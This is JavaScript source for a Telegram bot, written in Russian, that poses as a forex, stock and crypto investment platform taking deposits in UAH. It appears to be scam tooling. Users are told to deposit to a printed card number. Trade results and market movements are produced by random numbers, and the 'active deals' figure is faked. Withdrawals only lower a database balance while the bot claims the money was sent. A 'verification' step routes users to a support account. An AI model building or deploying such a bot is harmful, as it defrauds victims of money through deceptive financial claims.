import {
	verifyKeyboard,
	profileKeyboard,
	deleteKeyboard,
	investKeyboard,
	cryptoKeyboard,
	tradeKeyboard,
	tradeTimeKeyboard,
	walletKeyboard,
	stockKeyboard,
	doubleDeleteKeyboard,
	dealKeyboard,
	successWithdrawKeyboard
} from './keyboards.mjs'
import mongo from './db.mjs'
import TelegramBot from 'node-telegram-bot-api'
import fs from 'fs'
import express from 'express'
import dotenv from 'dotenv'

dotenv.config()

const app = express()
const port = process.env.PORT || 3000

const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true })
const users = mongo.db('ForexTelegramDB').collection('Users')
let isTradeComplete = true

const setTradeTime = async (time, chatId, query) => {
	if (!isTradeComplete) return
	isTradeComplete = false
	try {
		const dataFromDB = JSON.parse(
			JSON.stringify(await getUser(query.message.chat))
		)
		const userData = await getUser(query.message.chat)
		const min = time / 60
		const max = time / 20
		const income = Math.floor(Math.random() * (max - min) + min)

		let updatedWallet
		if (time === 10000) {
			updatedWallet = dataFromDB.data.wallet - income
		} else {
			updatedWallet = dataFromDB.data.wallet + income
		}

		await updateUser(chatId, {
			...userData.data,
			wallet: updatedWallet,
			deals: dataFromDB.data.deals + 1
		})

		setTimeout(() => {
			bot.deleteMessage(chatId, query.message.message_id - 2)
			bot.deleteMessage(chatId, query.message.message_id - 1)
			bot.deleteMessage(chatId, query.message.message_id)
			bot.sendMessage(
				chatId,
				`
	Сделка проведена✅\n
	Прибыль ${time === 10000 ? `-${income}` : income}
								`,
				{
					reply_markup: dealKeyboard
				}
			)
		}, time)
	} catch (error) {
		console.log(error)
	}
}

const updateUser = async (userId, data) => {
	try {
		await users.updateOne(
			{ id: userId },
			{ $set: { data } },
			{ upsert: true }
		)
	} catch (error) {
		console.log(error)
	}
}

const getUser = async (data) => {
	try {
		const user = await users.findOne({ id: data.id })
		return user
	} catch (error) {
		console.log(error)
	}
}

const chekForWithdraw = (dataFromDBwallet) => {
	bot.addListener('message', async (msg) => {
		const text = msg.text
		const chatId = msg.chat.id
		const minWithdraw = 500
		const userData = await getUser(msg.chat)

		if (!dataFromDBwallet)
			return bot.sendMessage(chatId, 'На вашем балансе нет денег', {
				reply_markup: doubleDeleteKeyboard
			})

		if (parseInt(text) > dataFromDBwallet)
			return bot.sendMessage(chatId, 'На балансе недостаточно средств', {
				reply_markup: doubleDeleteKeyboard
			})

		if (parseInt(text) < minWithdraw)
			return bot.sendMessage(
				chatId,
				'Минимальная сумма вывода - 500 UAH',
				{
					reply_markup: doubleDeleteKeyboard
				}
			)

		await updateUser(chatId, {
			...userData.data,
			wallet: dataFromDBwallet - text
		})

		bot.sendMessage(
			chatId,
			'✅Перевод произведён на карту, с которой поступило последнее пополнение!',
			{
				reply_markup: successWithdrawKeyboard
			}
		)
		return bot.removeAllListeners('message')
	})
}

const chekForTrade = (dataFromDBwallet) => {
	bot.addListener('message', async (msg) => {
		const text = msg.text
		const chatId = msg.chat.id
		const minBet = 500

		if (dataFromDBwallet === 0 && dataFromDBwallet <= minBet)
			return bot.sendMessage(chatId, 'Пополните баланс', {
				reply_markup: doubleDeleteKeyboard
			})

		if (parseInt(text) < minBet)
			return bot.sendMessage(chatId, 'Минимальная ставка: 500 UAH', {
				reply_markup: doubleDeleteKeyboard
			})

		if (parseInt(text) > dataFromDBwallet)
			return bot.sendMessage(chatId, 'Пополните баланс', {
				reply_markup: doubleDeleteKeyboard
			})

		bot.sendMessage(chatId, 'Выберите время ставки', {
			reply_markup: tradeTimeKeyboard
		})
		return bot.removeAllListeners('message')
	})
}

const start = () => {
	bot.setMyCommands([
		{ command: '/start', description: 'Знакомство с ботом' },
		{ command: '/profile', description: 'Мой профиль' }
	])
	bot.on('message', async (msg) => {
		const text = msg.text
		const chatId = msg.chat.id
		//* Оповещение о верификации

		if (text === '/start') {
			await updateUser(chatId, {
				...msg.chat,
				wallet: 0,
				verif: false,
				deals: 0
			})

			return bot.sendMessage(
				chatId,
				`
		🎉Привет, ${msg.chat.first_name}!\n
		Политика и условия пользования данным ботом:
		1. Перед принятием инвестиционного решения Инвестору необходимо самостоятельно оценить экономические риски и выгоды, 
		налоговые, юридические, бухгалтерские последствия заключения сделки, свою готовность и возможность принять такие риски.
		Клиент также несет расходы на оплату брокерских и депозитарных услуг.
		2. В случае необходимости администрация имеет право
		запросить у вас документы, подтверждающие вашу личность и ваше совершеннолетие.
		Каждому пользователю необходима верификация для вывода крупной суммы средств.
		3. Ваш аккаунт может быть заблокирован при подозрении на мошенничество/обман нашей системы!
		4. Мультиаккаунты запрещены!
		5. Если будут выявлены вышеперчисленные случаи, Ваш аккаунт будет заморожен до выяснения обстоятельств!
		Спасибо за понимание`,
				{
					reply_markup: verifyKeyboard
				}
			)
		}
	})

	bot.on('callback_query', async (query) => {
		const chatId = query.message.chat.id

		if (query.data === 'acceptVerify') {
			const dataFromDB = JSON.parse(
				JSON.stringify(await getUser(query.message.chat))
			)

			const deals = dataFromDB.data.deals
			const isVerify = dataFromDB.data.verif
			const stream = fs.createReadStream(
				'./assets/photo_2021-08-31_17-55-13.jpg'
			)

			bot.deleteMessage(chatId, query.message.message_id - 1)
			bot.deleteMessage(chatId, query.message.message_id)

			return bot.sendPhoto(chatId, stream, {
				caption: `
		👤Мой профиль\n
		🗣Имя: ${query.message.chat.first_name}
		👨‍💻Верификация: ${isVerify === false ? '❌' : '✅'}
		🤝Сделок: ${deals}
		📈Активных сделок на площадке: ${Math.floor(1300 + query.message.message_id)}`,
				reply_markup: profileKeyboard
			})
		}

		if (query.data === 'refresh') {
			const dataFromDB = JSON.parse(
				JSON.stringify(await getUser(query.message.chat))
			)

			const deals = dataFromDB.data.deals
			const isVerify = dataFromDB.data.verif
			const stream = fs.createReadStream(
				'./assets/photo_2021-08-31_17-55-13.jpg'
			)

			bot.deleteMessage(chatId, query.message.message_id)

			return bot.sendPhoto(chatId, stream, {
				caption: `
		👤Мой профиль\n
		🗣Имя: ${query.message.chat.first_name}
		👨‍💻Верификация: ${isVerify === false ? '❌' : '✅'}
		🤝Сделок: ${deals}
		📈Активных сделок на площадке: ${Math.floor(1300 + query.message.message_id)}`,
				reply_markup: profileKeyboard
			})
		}

		if (query.data === 'wallet') {
			return bot.sendMessage(
				chatId,
				`
		💼Ваш кошелек\n
		🆔Ваш пользовательский ID: ${chatId}
		💱Валюта: UAH
		🏦Баланс: ${
			JSON.parse(JSON.stringify(await getUser(query.message.chat))).data
				.wallet
		} UAH`,
				{
					reply_markup: walletKeyboard
				}
			)
		}

		if (query.data === 'donate') {
			const stream = fs.createReadStream('./assets/donate.jpg')
			return bot.sendPhoto(chatId, stream, {
				caption: `
		🤵 Для пополнения баланса\n
		❗️ Минимальная сумма пополнения - 500 UAH\n
		💳 Реквизиты : 5375411413556163
		💬 Комментарий : FRX-INV:${query.message.chat.id}\n
		⚠️Скопируйте реквизиты и комментарий!\n
		⚠️Баланс обновляется в течение 5-10 минут\n
		⚠️Если вы не можете указать комментарий, после оплаты пришлите чек/скриншот или же квитанцию в техническую поддержку.\n
		🛠 Тех.Поддержка - @ForexSupportUA`,
				reply_markup: deleteKeyboard
			})
		}

		if (query.data === 'withdraw') {
			const dataFromDBwallet = JSON.parse(
				JSON.stringify(await getUser(query.message.chat))
			).data.wallet
			await bot.sendMessage(
				chatId,
				`
		🤵 Для вывода средств
		УКАЖИТЕ СУММУ В СЛЕДУЮЩЕМ СООБЩЕНИИ:\n
		💬 Комментарий : FRX-INV:${query.message.chat.id}\n
		⚠️Выплата придёт на карту, с которой было произведено последнее пополнение баланса!\n
		⚠️Перевод будет с комментарием, который указан выше!\n
		⚠️Минимальная сумма вывода - 500 UAH!\n
		⚠️Деньги приходят в течение 5-15 минут после вывода, если возникли проблемы, обратитесь в поддержку!\n
		⚠️ 🛠 Тех.Поддержка - @ForexSupportUA`,
				{
					reply_markup: deleteKeyboard
				}
			)
			chekForWithdraw(dataFromDBwallet)
			return
		}

		if (query.data === 'information') {
			return bot.sendMessage(
				chatId,
				`
		❓Частые вопросы и ответы на них\n
		1. Как происходит инвестирование?
		Инвестирование происходит в краткие сроки на фоне падения или роста активов.\n
		2. Как пройти верификацию?
		Верификация происходит в виде удостоверения личности в Тех.Поддержке - @ForexSupportUA.`,
				{
					reply_markup: deleteKeyboard
				}
			)
		}

		if (query.data === 'invest') {
			return bot.sendMessage(chatId, 'Выберите область инвестирования', {
				reply_markup: investKeyboard
			})
		}

		if (query.data === 'investStock') {
			return bot.sendMessage(
				chatId,
				'Выберите акцию для инвестирования',
				{
					reply_markup: stockKeyboard
				}
			)
		}

		if (query.data === 'investAmazon') {
			return bot.sendMessage(
				chatId,
				`
		Компания: Amazon\n
		Курс акции: 2 475 $
		Последнее движение: ${Math.round(Math.random()) ? 'понижение' : 'повышение'}
						`,
				{
					reply_markup: tradeKeyboard
				}
			)
		}
		if (query.data === 'investTesla') {
			return bot.sendMessage(
				chatId,
				`
		Компания: Tesla\n
		Курс акции: 765 $
		Последнее движение: ${Math.round(Math.random()) ? 'понижение' : 'повышение'}
						`,
				{
					reply_markup: tradeKeyboard
				}
			)
		}
		if (query.data === 'investApple') {
			return bot.sendMessage(
				chatId,
				`
		Компания: Apple\n
		Курс акции: 150 $
		Последнее движение: ${Math.round(Math.random()) ? 'понижение' : 'повышение'}
						`,
				{
					reply_markup: tradeKeyboard
				}
			)
		}
		if (query.data === 'investGoogle') {
			return bot.sendMessage(
				chatId,
				`
		Компания: Google\n
		Курс акции: 2 322 $
		Последнее движение: ${Math.round(Math.random()) ? 'понижение' : 'повышение'}
						`,
				{
					reply_markup: tradeKeyboard
				}
			)
		}

		if (query.data === 'investCrypto') {
			return bot.sendMessage(
				chatId,
				'Выберите криптовалюту для инвестирования',
				{
					reply_markup: cryptoKeyboard
				}
			)
		}

		if (query.data === 'investBitcoin') {
			return bot.sendMessage(
				chatId,
				`
		Криптовалюта: Bitcoin\n
		Курс валюты: 29 362 $
		Последнее движение: ${Math.round(Math.random()) ? 'понижение' : 'повышение'}
						`,
				{
					reply_markup: tradeKeyboard
				}
			)
		}
		if (query.data === 'investEthereum') {
			return bot.sendMessage(
				chatId,
				`
		Криптовалюта: Ethereum\n
		Курс валюты: 1 957 $
		Последнее движение: ${Math.round(Math.random()) ? 'понижение' : 'повышение'}
						`,
				{
					reply_markup: tradeKeyboard
				}
			)
		}
		if (query.data === 'investBNB') {
			return bot.sendMessage(
				chatId,
				`
		Криптовалюта: Binance coin\n
		Курс валюты: 318 $
		Последнее движение: ${Math.round(Math.random()) ? 'понижение' : 'повышение'}
						`,
				{
					reply_markup: tradeKeyboard
				}
			)
		}
		if (query.data === 'investSolana') {
			return bot.sendMessage(
				chatId,
				`
		Криптовалюта: Solana\n
		Курс валюты: 44 $
		Последнее движение: ${Math.round(Math.random()) ? 'понижение' : 'повышение'}
						`,
				{
					reply_markup: tradeKeyboard
				}
			)
		}

		if (query.data === 'trade') {
			const dataFromDBwallet = JSON.parse(
				JSON.stringify(await getUser(query.message.chat))
			).data.wallet

			await bot.sendMessage(
				chatId,
				`
		Введите сумму ставки в чат:\n
		Ваш баланс: ${dataFromDBwallet} UAH
		Минимальная ставка: 500 UAH
					`,
				{
					reply_markup: deleteKeyboard
				}
			)
			chekForTrade(dataFromDBwallet)
			return
		}

		if (query.data === '10sec') {
			setTradeTime(10000, chatId, query)
			return
		}

		if (query.data === '30sec') {
			setTradeTime(30000, chatId, query)
			return
		}

		if (query.data === '60sec') {
			setTradeTime(60000, chatId, query)
			return
		}

		if (query.data === 'investFaq') {
			return bot.sendMessage(
				chatId,
				`
		Как это работает?\n
		Мы являемся посредником между вами и биржей.
		За свои услуги мы взымаем 2.5% прибыли.
		Все риски вы принимаете на себя.
		Рекомендуем изучить курсы перед инвестициями, или иметь опытного наставника.
		Инестиции происходят в краткосрочном режиме.
		Выберите криптовалюту для инвестирования, затем выберите время ставки, дождитесь результатов инвестирования.`,
				{
					reply_markup: deleteKeyboard
				}
			)
		}

		if (query.data === 'delete') {
			return bot.deleteMessage(chatId, query.message.message_id)
		}

		if (query.data === 'doubleDelete') {
			bot.deleteMessage(chatId, query.message.message_id - 1)
			return bot.deleteMessage(chatId, query.message.message_id)
		}

		bot.answerCallbackQuery({ callback_query_id: query.id })
	})
}

start()

app.listen(port, () => {
	console.log(`App listening on port ${port}`)
})
